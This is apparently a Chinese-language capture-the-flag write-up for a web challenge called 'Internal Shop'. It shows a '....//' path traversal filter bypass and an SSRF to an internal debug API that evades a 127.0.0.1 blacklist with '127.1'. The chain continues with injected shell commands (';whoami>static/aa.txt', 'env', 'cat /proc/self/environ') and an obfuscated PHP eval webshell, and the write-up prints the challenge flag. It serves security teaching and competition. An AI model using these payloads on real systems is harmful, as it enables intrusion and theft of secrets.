    服务器对用户输入的 file 参数进行了简单的过滤 —— 将 ../ 替换为空字符串。但这个过滤只执行一次，攻击者可以通过双写 ....// 来绕过：

    输入:      ....//README.txt
过滤后:    ../README.txt    （中间的 ../ 被删除，两侧的 . 和 / 重新拼合）

    Stage2 — Can't see the result? Just take it out（Internal Shop）

    题目类型：Web — SSRF + 命令注入（无回显）

    题目地址：ZeroG CTF 2026 · Stage2（实例已关闭）

    Flag：flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    题目概述

    和 ZeroG_2026（Stage 2） 不是同一题 —— 那篇是 PHP 弱类型与参数名变形，这篇是 SSRF。

    站点叫 Internal Shop，是一个"多平台价格比价系统"。输入商品页 URL，服务端去抓取并比价。

    导航里还有一个「系统信息」页 —— 后面就是从这里拿到内部接口的。

    解题过程

    Step 1：从两个页面提取信息

    首页是一个 URL 输入框，右上角有两个入口：「比价抓取」和「系统信息」。

    先进「系统信息」，页面上直接写了内部服务接口文档：

    内部 API 地址   http://127.0.0.1:5001
接口列表        /api/product?id=1
                /api/debug?cmd=whoami
说明            内部 API 仅允许本地访问，且主站不回显内部响应

    两条信息很关键：

    ① 内部服务只监听 127.0.0.1:5001，外网碰不到
② 主站不会把内部响应显示出来 —— 也就是说，就算打通了也是"盲"的

    Step 2：直接打 127.0.0.1 — 失败

    既然比价功能是"服务端抓取 URL"，那它就是天然的 SSRF 入口。直接把目标换成内部地址：

    http://127.0.0.1:5001/api/debug?cmd=whoami

    返回：

    抓取失败
非法的 URL

    说明 127.0.0.1 被黑名单挡了。

    Step 3：换一个写法绕过 — 成功

    127.0.0.1 有很多等价写法，只要目标解析到同一个地址、但不命中黑名单里的字符串就行：

    这里我用的是 127.1：

    http://127.1:5001/api/debug?cmd=whoami

    抓取成功了：

    但页面只说"已完成比价，结果稍后通过邮件发送" —— 内部响应确实不回显。

    Step 4：把结果带出来 — 重定向写到静态目录

    既然拿不到回显，那就让内部命令自己把结果写到主站能访问到的地方。

    static 这个目录是在源码里看到的：

    <link rel="stylesheet" href="/static/style.css">

    构造 payload，把命令输出重定向进去：

    http://127.1:5001/api/debug?cmd=whoami>static/out.txt

    然后直接访问 out.txt。

    Step 5：输出里混进了 Debug — 需要闭合前一句

    看 out.txt 时发现，命令的输出和 Debug 字样被一起打印了出来。所以猜测后端大概是：

    return "Debug: " + cmd_result

    也就是说，我传的 >static/out.txt 会把整个 echo 的结果改写进文件，而不只是命令输出。

    所以要先把前面那句截断，让重定向只作用于我自己的命令：

    http://127.1:5001/api/debug?cmd=;whoami>static/aa.txt

    闭合之后输出就干净了：

    root

    Step 6：换命令找 flag — 先查环境变量

    能写文件、能读文件，接下来就是找 flag。先查环境变量（比翻目录快）：

    http://127.1:5001/api/debug?cmd=;env>static/ea.txt

    在 ea.txt 里找到了：

    ZEROG_2026_FLAG=flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    解题思路总结

    首页只有 URL 输入框
  → 进「系统信息」页，读到内部 API：127.0.0.1:5001 与 /api/debug?cmd=
    → 直接填 127.0.0.1，被判定为"非法的 URL"
      → 换成 127.1（同一地址的等价写法），抓取成功
        → 但页面不回显内部响应（题目明说了）
          → 用命令重定向把结果写进 static/ 目录，再直接访问该文件
            → out.txt 里混着 Debug 字样，说明前面有 echo
              → 用 ; 截断前一句，输出变干净（root）
                → 换 env 命令，拿到 ZEROG_2026_FLAG

    漏洞原理

    ① SSRF：服务端替我去请求

    比价功能必须由服务端抓取 URL，这个"抓取"没有限制目标 —— 于是可以把目标指向只有服务器自己能访问的 127.0.0.1:5001。

    ② 黑名单只匹配字符串，不匹配语义

    被拦：127.0.0.1
放过：127.1        ← 同一个地址，字符串不同

    127.1 是 IPv4 的短格式，解析器会自动补全成 127.0.0.1。黑名单拦的是写法，不是地址。

    ③ 无回显：把输出换成"写入可访问路径"

    正常思路   命令 → 响应 → 我看
无回显     命令 → 重定向写文件 → 我再访问那个文件

    ④ 闭合：输出里混了别的东西，说明它被包在一句话里

    看到 Debug: 和命令结果一起出现，就知道后端大概在做字符串拼接。; 把前一句结束掉，重定向才只作用于我的命令。

    附：三个问题

    ① poster.jpg?v=1793248668 里的 v= 是什么

    缓存破坏参数（cache buster）。

    文件名永远是 poster.jpg，浏览器会缓存旧图；加一个每次变化的 v（通常是 Unix 时间戳）让 URL 变掉，强制重新下载。

    1793248668 ≈ 2026-10-29 的 Unix 时间戳（秒）

    服务器不读它，PHP 也不用它 —— 纯前端约定。 对我们反而有用：改完 payload 带上新 v，能确保看到的是新响应。

    ② 为什么用 env 找 flag，而不是找目录

    因为 flag 不一定是文件。

    这题的 flag 是平台在容器启动时通过环境变量注入的，不落盘：

    flag 不落盘 → 读文件读不到 → 备份/目录遍历/源码泄露都拿不到
只有真正拿到 RCE 才能读 → 考的是"能执行命令",不是"能猜路径"

    排查顺序应该是：

    ① ls -la /            先看有没有 flag 文件
② env                 没有就查环境变量
③ find / -name "*flag*"   再扫一遍
④ cat /proc/self/environ  环境变量换个读法

    ③ 能不能用 $_POST + 蚁剑

    能，但 echo$_POST["1"]`` 这种写法不行。

    echo \...`` 是命令执行** —— 参数被当 shell 命令跑。**

    蚁剑要的是代码执行** —— 它往参数里塞的是 PHP 代码，入口必须是：**

    eval($_POST['x'])

    而 eval 在黑名单里，所以要用拼接：

    $a='ev'.'al'; $a($_POST[1]);

    关键点：这道题的黑名单只扫上传文件的内容，不扫 HTTP 请求体 —— 所以蚁剑发过来的 body 里带什么词都不受影响。
